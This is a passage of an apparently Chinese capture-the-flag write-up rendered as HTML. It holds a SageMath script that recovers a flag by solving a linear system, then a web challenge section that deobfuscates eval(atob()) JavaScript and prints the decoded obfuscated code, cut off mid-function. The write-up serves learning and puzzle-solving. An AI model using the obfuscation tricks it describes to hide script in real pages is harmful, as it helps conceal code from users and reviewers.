   <span class="number">69</span>, <span class="number">44</span>],</span><br><span class="line">    [<span class="number">58</span>, <span class="number">53</span>, <span class="number">93</span>, <span class="number">4</span>, <span class="number">33</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">64</span>, <span class="number">54</span>, <span class="number">20</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">42</span>, <span class="number">29</span>, <span class="number">96</span>, <span class="number">40</span>, <span class="number">22</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">42</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">39</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">50</span>],</span><br><span class="line">    [<span class="number">89</span>, <span class="number">73</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">19</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">65</span>, <span class="number">37</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">42</span>, <span class="number">74</span>, <span class="number">43</span>, <span class="number">72</span>, <span class="number">4</span>, <span class="number">94</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">91</span>, <span class="number">69</span>, <span class="number">7</span>, <span class="number">39</span>, <span class="number">96</span>, <span class="number">76</span>, <span class="number">5</span>, <span class="number">32</span>,</span><br><span class="line">     <span class="number">57</span>, <span class="number">22</span>],</span><br><span class="line">    [<span class="number">60</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">62</span>, <span class="number">42</span>, <span class="number">86</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">92</span>, <span class="number">26</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">50</span>, <span class="number">97</span>, <span class="number">62</span>, <span class="number">71</span>,</span><br><span class="line">     <span class="number">65</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">74</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">74</span>, <span class="number">30</span>, <span class="number">97</span>, <span class="number">63</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">56</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">18</span>, <span class="number">65</span>, <span class="number">67</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">6</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">45</span>,</span><br><span class="line">     <span class="number">81</span>],</span><br><span class="line">    [<span class="number">79</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">36</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">97</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">20</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">87</span>, <span class="number">8</span>,</span><br><span class="line">     <span class="number">40</span>],</span><br><span class="line">    [<span class="number">79</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">31</span>, <span class="number">76</span>, <span class="number">58</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">97</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">65</span>, <span class="number">52</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">76</span>, <span class="number">41</span>, <span class="number">75</span>, <span class="number">52</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">96</span>, <span class="number">29</span>,</span><br><span class="line">     <span class="number">64</span>, <span class="number">59</span>],</span><br><span class="line">    [<span class="number">34</span>, <span class="number">95</span>, <span class="number">66</span>, <span class="number">79</span>, <span class="number">91</span>, <span class="number">35</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">95</span>, <span class="number">95</span>, <span class="number">40</span>, <span class="number">68</span>, <span class="number">13</span>, <span class="number">54</span>, <span class="number">80</span>, <span class="number">98</span>, <span class="number">15</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">79</span>, <span class="number">34</span>, <span class="number">54</span>, <span class="number">92</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">95</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">83</span>, <span class="number">79</span>],</span><br><span class="line">    [<span class="number">74</span>, <span class="number">42</span>, <span class="number">45</span>, <span class="number">72</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">57</span>, <span class="number">62</span>, <span class="number">85</span>, <span class="number">6</span>, <span class="number">72</span>, <span class="number">25</span>, <span class="number">78</span>, <span class="number">27</span>, <span class="number">6</span>, <span class="number">27</span>, <span class="number">61</span>, <span class="number">88</span>, <span class="number">60</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">76</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">7</span>,</span><br><span class="line">     <span class="number">35</span>],</span><br><span class="line">    [<span class="number">53</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">99</span>, <span class="number">40</span>, <span class="number">85</span>, <span class="number">42</span>, <span class="number">35</span>, <span class="number">99</span>, <span class="number">88</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">91</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">68</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">73</span>, <span class="number">83</span>,</span><br><span class="line">     <span class="number">46</span>, <span class="number">44</span>],</span><br><span class="line">    [<span class="number">89</span>, <span class="number">93</span>, <span class="number">48</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">76</span>, <span class="number">32</span>, <span class="number">66</span>, <span class="number">25</span>, <span class="number">39</span>, <span class="number">59</span>, <span class="number">14</span>, <span class="number">48</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">76</span>, <span class="number">72</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">96</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">29</span>, <span class="number">17</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">61</span>,</span><br><span class="line">     <span class="number">37</span>, <span class="number">12</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">25</span>, <span class="number">16</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">39</span>, <span class="number">59</span>, <span class="number">82</span>, <span class="number">54</span>, <span class="number">69</span>, <span class="number">59</span>, <span class="number">86</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">21</span>, <span class="number">46</span>, <span class="number">89</span>, <span class="number">96</span>, <span class="number">32</span>, <span class="number">35</span>, <span class="number">69</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">95</span>, <span class="number">58</span>, <span class="number">94</span>, <span class="number">29</span>, <span class="number">84</span>,</span><br><span class="line">     <span class="number">24</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">50</span>, <span class="number">48</span>, <span class="number">87</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">31</span>, <span class="number">18</span>, <span class="number">89</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">87</span>, <span class="number">98</span>, <span class="number">82</span>, <span class="number">31</span>, <span class="number">71</span>, <span class="number">30</span>, <span class="number">28</span>, <span class="number">95</span>, <span class="number">22</span>, <span class="number">15</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">92</span>, <span class="number">32</span>,</span><br><span class="line">     <span class="number">97</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">40</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">87</span>, <span class="number">95</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">22</span>, <span class="number">43</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">50</span>, <span class="number">85</span>, <span class="number">39</span>, <span class="number">22</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">65</span>, <span class="number">19</span>, <span class="number">64</span>, <span class="number">48</span>, <span class="number">41</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">66</span>,</span><br><span class="line">     <span class="number">12</span>],</span><br><span class="line">    [<span class="number">37</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">49</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">52</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">83</span>, <span class="number">2</span>, <span class="number">50</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">13</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">41</span>, <span class="number">47</span>, <span class="number">35</span>,</span><br><span class="line">     <span class="number">67</span>, <span class="number">74</span>],</span><br><span class="line">    [<span class="number">37</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">36</span>, <span class="number">93</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">95</span>, <span class="number">43</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">89</span>, <span class="number">43</span>, <span class="number">32</span>,</span><br><span class="line">     <span class="number">95</span>],</span><br><span class="line">    [<span class="number">52</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">29</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">74</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">98</span>, <span class="number">54</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">51</span>, <span class="number">37</span>, <span class="number">85</span>, <span class="number">84</span>, <span class="number">78</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">97</span>, <span class="number">92</span>,</span><br><span class="line">     <span class="number">78</span>],</span><br><span class="line">    [<span class="number">24</span>, <span class="number">70</span>, <span class="number">59</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">59</span>, <span class="number">95</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">79</span>, <span class="number">88</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">47</span>, <span class="number">76</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">32</span>, <span class="number">82</span>,</span><br><span class="line">     <span class="number">37</span>, <span class="number">20</span>],</span><br><span class="line">    [<span class="number">76</span>, <span class="number">10</span>, <span class="number">22</span>, <span class="number">48</span>, <span class="number">64</span>, <span class="number">22</span>, <span class="number">94</span>, <span class="number">25</span>, <span class="number">44</span>, <span class="number">83</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">58</span>, <span class="number">41</span>, <span class="number">4</span>, <span class="number">29</span>, <span class="number">96</span>, <span class="number">78</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">62</span>, <span class="number">81</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">82</span>, <span class="number">14</span>, <span class="number">46</span>, <span class="number">16</span>,</span><br><span class="line">     <span class="number">18</span>, <span class="number">69</span>],</span><br><span class="line">    [<span class="number">98</span>, <span class="number">61</span>, <span class="number">33</span>, <span class="number">62</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">88</span>, <span class="number">75</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">11</span>, <span class="number">48</span>, <span class="number">87</span>, <span class="number">34</span>, <span class="number">14</span>, <span class="number">76</span>, <span class="number">13</span>, <span class="number">39</span>, <span class="number">27</span>, <span class="number">62</span>, <span class="number">38</span>, <span class="number">53</span>, <span class="number">27</span>, <span class="number">20</span>,</span><br><span class="line">     <span class="number">67</span>, <span class="number">94</span>],</span><br><span class="line">    [<span class="number">82</span>, <span class="number">42</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">25</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">26</span>, <span class="number">62</span>, <span class="number">76</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">31</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">72</span>, <span class="number">95</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">53</span>,</span><br><span class="line">     <span class="number">36</span>, <span class="number">71</span>],</span><br><span class="line">    [<span class="number">75</span>, <span class="number">5</span>, <span class="number">53</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">80</span>, <span class="number">41</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">81</span>, <span class="number">73</span>, <span class="number">24</span>, <span class="number">96</span>, <span class="number">61</span>, <span class="number">87</span>, <span class="number">28</span>, <span class="number">89</span>, <span class="number">43</span>, <span class="number">46</span>, <span class="number">4</span>, <span class="number">59</span>, <span class="number">91</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">74</span>],</span><br><span class="line">    [<span class="number">81</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">72</span>, <span class="number">8</span>, <span class="number">61</span>, <span class="number">5</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">57</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">92</span>, <span class="number">39</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">60</span>, <span class="number">35</span>, <span class="number">59</span>, <span class="number">74</span>, <span class="number">42</span>, <span class="number">51</span>, <span class="number">93</span>,</span><br><span class="line">     <span class="number">20</span>],</span><br><span class="line">    [<span class="number">48</span>, <span class="number">35</span>, <span class="number">21</span>, <span class="number">87</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">69</span>, <span class="number">34</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">75</span>, <span class="number">98</span>, <span class="number">18</span>, <span class="number">86</span>, <span class="number">19</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">74</span>, <span class="number">97</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">74</span>, <span class="number">90</span>, <span class="number">33</span>,</span><br><span class="line">     <span class="number">71</span>, <span class="number">46</span>],</span><br><span class="line">    [<span class="number">74</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">69</span>, <span class="number">54</span>, <span class="number">86</span>, <span class="number">75</span>, <span class="number">34</span>, <span class="number">30</span>, <span class="number">42</span>, <span class="number">71</span>, <span class="number">52</span>, <span class="number">35</span>, <span class="number">22</span>, <span class="number">91</span>, <span class="number">34</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">48</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">64</span>, <span class="number">60</span>, <span class="number">85</span>, <span class="number">79</span>,</span><br><span class="line">     <span class="number">52</span>, <span class="number">22</span>],</span><br><span class="line">    [<span class="number">65</span>, <span class="number">99</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">59</span>, <span class="number">74</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">88</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">68</span>, <span class="number">2</span>, <span class="number">22</span>, <span class="number">69</span>, <span class="number">32</span>, <span class="number">38</span>, <span class="number">27</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">85</span>,</span><br><span class="line">     <span class="number">40</span>],</span><br><span class="line">    [<span class="number">11</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">94</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">15</span>, <span class="number">92</span>, <span class="number">64</span>, <span class="number">39</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">41</span>, <span class="number">67</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">92</span>, <span class="number">54</span>, <span class="number">37</span>, <span class="number">94</span>,</span><br><span class="line">     <span class="number">71</span>, <span class="number">25</span>],</span><br><span class="line">    [<span class="number">78</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">90</span>, <span class="number">14</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">57</span>, <span class="number">14</span>, <span class="number">47</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">77</span>, <span class="number">13</span>, <span class="number">69</span>, <span class="number">62</span>, <span class="number">85</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">75</span>,</span><br><span class="line">     <span class="number">48</span>, <span class="number">69</span>],</span><br><span class="line">    [<span class="number">85</span>, <span class="number">75</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">72</span>, <span class="number">14</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">71</span>, <span class="number">21</span>, <span class="number">52</span>, <span class="number">12</span>, <span class="number">48</span>, <span class="number">67</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">59</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">9</span>, <span class="number">28</span>, <span class="number">60</span>, <span class="number">66</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">51</span>, <span class="number">84</span>,</span><br><span class="line">     <span class="number">33</span>, <span class="number">38</span>]</span><br><span class="line">]</span><br><span class="line">b = [<span class="number">159700</span>,<span class="number">171444</span>,<span class="number">131705</span>,<span class="number">149011</span>,<span class="number">114939</span>,<span class="number">147181</span>,<span class="number">146558</span>,<span class="number">146290</span>,<span class="number">127198</span>,<span class="number">149303</span>,<span class="number">180077</span>,<span class="number">142239</span>,<span class="number">179115</span>,<span class="number">142706</span>,<span class="number">146480</span>,<span class="number">168401</span>,<span class="number">117331</span>,<span class="number">125357</span>,<span class="number">138223</span>,<span class="number">138560</span>,<span class="number">148441</span>,<span class="number">134112</span>,<span class="number">145615</span>,<span class="number">144052</span>,<span class="number">154311</span>,<span class="number">164152</span>,<span class="number">164871</span>,<span class="number">158482</span>,<span class="number">140834</span>,<span class="number">134191</span>,<span class="number">153769</span>,<span class="number">151583</span>]</span><br><span class="line">M = matrix(ZZ,a).T</span><br><span class="line">bb = vector(ZZ,b)</span><br><span class="line">m = M.solve_left(bb).<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="爆率真的高"><a href="#爆率真的高" class="headerlink" title="爆率真的高"></a>爆率真的高</h2><p>找到相应的js代码<br>eval(atob()) 混淆<br>可在eval（）中多重转码混淆，依旧可以执行js代码，有返回值</p><p>将其base64解码后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x4d45</span>(<span class="params">_0xd1b659,_0xad76b</span>)&#123;<span class="keyword">var</span> _0x22844d=<span class="title function_">_0x2a83</span>();<span class="keyword">return</span> _0x4d45=<span class="keyword">function</span>(<span class="params">_0x442e70,_0x1c3598</span>)&#123;_0x442e70=_0x442e70-(<span class="number">0x14f5</span>+<span class="number">0x1cb7</span>+-<span class="number">0x2fbd</span>);<span class="keyword">var</span> _0x1fc933=_0x22844d[_0x442e70];<span class="keyword">if</span>(_0x4d45[<span class="string">&#x27;RSnkVI&#x27;</span>]===<span class="literal">undefined</span>)&#123;<span class="keyword">var</span> _0x3e5dd9=<span class="keyword">function</span>(<span class="params">_0x1cd321</span>)&#123;<span class="keyword">var</span> _0x3de614=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#x27;</span>;<span class="keyword">var</span> _0x1c3472=<span class="string">&#x27;&#x27;</span>,_0x1e03c2=<span class="string">&#x27;&#x27;</span>,_0x45b8b1=_0x1c3472+_0x3e5dd9;<span class="keyword">for</span>(<span class="keyword">var</span> _0x57bead=-<span class="number">0x43e</span>+-<span class="number">0x4d9</span>*-<span class="number">0x5</span>+-<span class="number">0x1</span>*<span class="number">0x13ff</span>,_0x2c4bf8,_0xc664a7,_0x588e56=<span class="number">0x3</span>*-<span class="number">0x75f</span>+<span class="number">0x1</span>*<span class="number">0x201d</span>+-<span class="number">0x80</span>*<span class="number">0x14</span>;_0xc664a7=_0x1cd321[<span class="string">&#x27;charAt&#x27;</span>](_0x588e56++);~_0xc664a7&amp;&amp;(_0x2c4bf8=_0x57bead%(-<span class="number">0x7a4</span>*-<span class="number">0x4</span>+<span class="number">0x21b7</span>+<span class="number">0x1</span>*-<span class="number">0x4043</span>)?_0x2c4bf8*(<span class="number">0x21e7</span>+-<span class="number">0x452</span>+-<span class="number">0x3</span>*<span class="number">0x9c7</span>)+<span class="attr">_0xc664a7</span>:_0xc664a7,_0x57bead++%(-<span class="number">0xd77</span>+<span class="number">0x1ba9</span>+-<span class="number">0xe2e</span>))?_0x1c3472+=_0x45b8b1[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x588e56+(<span class="number">0xfd1</span>+-<span class="number">0x318</span>+<span class="number">0x11</span>*-<span class="number">0xbf</span>))-(<span class="number">0x98f</span>+<span class="number">0x1</span>*<span class="number">0x1c83</span>+-<span class="number">0x1</span>*<span class="number">0x2608</span>)!==<span class="number">0x1c24</span>+<span class="number">0x2100</span>+-<span class="number">0x2</span>*<span class="number">0x1e92</span>?<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](-<span class="number">0x162</span>*-<span class="number">0x18</span>+<span class="number">0xc2</span>*-<span class="number">0x13</span>+-<span class="number">0x11cb</span>&amp;_0x2c4bf8&gt;&gt;(-(-<span class="number">0x240c</span>+-<span class="number">0x34</span>*-<span class="number">0x12</span>+<span class="number">0x2066</span>)*_0x57bead&amp;<span class="number">0x228c</span>+<span class="number">0x3d4</span>+-<span class="number">0x265a</span>)):<span class="attr">_0x57bead</span>:<span class="number">0x7</span>*<span class="number">0x4c3</span>+-<span class="number">0x916</span>*<span class="number">0x4</span>+<span class="number">0x303</span>)&#123;_0xc664a7=_0x3de614[<span class="string">&#x27;indexOf&#x27;</span>](_0xc664a7);&#125;<span class="keyword">for</span>(<span class="keyword">var</span> _0x109fb3=-<span class="number">0x1554</span>+-<span class="number">0x14b6</span>+<span class="number">0x2a0a</span>,_0x540544=_0x1c3472[<span class="string">&#x27;length&#x27;</span>];_0x109fb3&lt;_0x540544;_0x109fb3++)&#123;_0x1e03c2+=<span class="string">&#x27;%&#x27;</span>+(<span class="string">&#x27;00&#x27;</span>+_0x1c3472[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x109fb3)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x1</span>*<span class="number">0x2701</span>+<span class="number">0x68</span>*<span class="number">0x4</span>+-<span class="number">0x2891</span>))[<span class="string">&#x27;slice&#x27;</span>](-(-<span class="number">0x1</span>*<span class="number">0x228b</span>+-<span class="number">0x2</span>*-<span class="number">0x11d4</span>+<span class="number">0x11b</span>*-<span class="number">0x1</span>));&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x1e03c2);&#125;;<span class="keyword">var</span> _0x4029f8=<span class="keyword">function</span>(<span class="params">_0xfb34ee,_0x53968b</span>)&#123;<span class="keyword">var</span> _0x588e35=[],_0x52377c=<span class="number">0x2d4</span>*-<span class="number">0x7</span>+<span class="number">0x7bb</span>+<span class="number">0x1</span>*<span class="number">0xc11</span>,_0x5b2fcd,_0x5b55da=<span class="string">&#x27;&#x27;</span>;_0xfb34ee=<span class="title function_">_0x3e5dd9</span>(_0xfb34ee);<span class="keyword">var</span> _0x1aca7f;<span class="keyword">for</span>(_0x1aca7f=<span class="number">0x1da1</span>+-<span class="number">0x326</span>*-<span class="number">0x5</span>+-<span class="number">0x2d5f</span>;_0x1aca7f&lt;-<span class="number">0x17a7</span>*<span class="number">0x1</span>+-<span class="number">0x1</span>*-<span class="number">0x182f</span>+-<span class="number">0x1</span>*-<span class="number">0x78</span>;_0x1aca7f++)&#123;_0x588e35[_0x1aca7f]=_0x1aca7f;&#125;<span class="keyword">for</span>(_0x1aca7f=<span class="number">0xd9f</span>+<span class="number">0xeb4</span>+<span class="number">0x3</span>*-<span class="number">0x971</span>;_0x1aca7f&lt;<span class="number">0x134e</span>*-<span class="number">0x1</span>+-<span class="number">0x1</span>*<span class="number">0x1413</span>+<span class="number">0x2861</span>;_0x1aca7f++)&#123;_0x52377c=(_0x52377c+_0x588e35[_0x1aca7f]+_0x53968b[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x1aca7f%_0x53968b[<span class="string">&#x27;length&#x27;</span>]))%(-<span class="number">0x138e</span>*-<span class="number">0x1</span>+-<span class="number">0x248b</span>+-<span class="number">0x5ff</span>*-<span class="number">0x3</span>),_0x5b2fcd=_0x588e35[_0x1aca7f],_0x588e35[_0x1aca7f]=_0x588e35[_0x52377c],_0x588e35[_0x52377c]=_0x5b2fcd;&#125;_0x1aca7f=-<span class="number">0xc6</span>*-<span class="number">0x6</span>+-<span class="number">0x1</span>*<span class="number">0x9ad</span>+-<span class="number">0x509</span>*-<span class="number">0x1</span>,_0x52377c=<span class="number">0x518</span>+<span class="number">0x53</span>*<span class="number">0x19</span>+-<span class="number">0xd33</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x10df20=<span class="number">0xd66</span>+<span class="number">0x1beb</span>+<span class="number">0x5e7</span>*-<span class="number">0x7</span>;_0x10df20&lt;_0xfb34ee[<span class="string">&#x27;length&#x27;</span>];_0x10df20++)&#123;_0x1aca7f=(_0x1aca7f+(<span class="number">0x848</span>+-<span class="number">0x1</span>*-<span class="number">0x559</span>+-<span class="number">0xda0</span>))%(-<span class="number">0x64c</span>+-<span class="number">0x265</span>*-<span class="number">0x9</span>+-<span class="number">0x59</span>*<span class="number">0x29</span>),_0x52377c=(_0x52377c+_0x588e35[_0x1aca7f])%(<span class="number">0x1</span>*<span class="number">0x1567</span>+<span class="number">0xbd5</span>+<span class="number">0x203c</span>*-<span class="number">0x1</span>),_0x5b2fcd=_0x588e35[_0x1aca7f],_0x588e35[_0x1aca7f]=_0x588e35[_0x52377c],_0x588e35[_0x52377c]=_0x5b2fcd,_0x5b55da+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](_0xfb34ee[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x10df20)^_0x588e35[(_0x588e35[_0x1aca7f]+_0x588e35[_0x52377c])%(-<span class="number">0x26e8</span>+-<span class="number">0x2d9</span>*-<span class="number">0x9</span>+-<span class="number">0x2b</span>*-<span class="number">0x55</span>)]);&#125;<span class="keyword">return</span> 